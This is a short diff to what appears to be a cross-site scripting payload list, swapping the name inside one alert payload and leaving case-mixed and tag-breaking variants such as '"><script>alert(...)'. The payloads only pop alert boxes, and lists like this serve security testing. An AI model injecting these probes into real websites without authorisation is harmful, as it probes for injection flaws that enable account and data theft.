@@ -1,4 +1,4 @@
-<script>alert('Zer0Lulz')</script>
+<script>alert('TheZakMan')</script>
 <ScRiPt>AlErT('XSS')</ScRiPt>
 "><script>alert('XSS')</script>
 "><ScRiPt>AlErT('XSS')</ScRiPt>
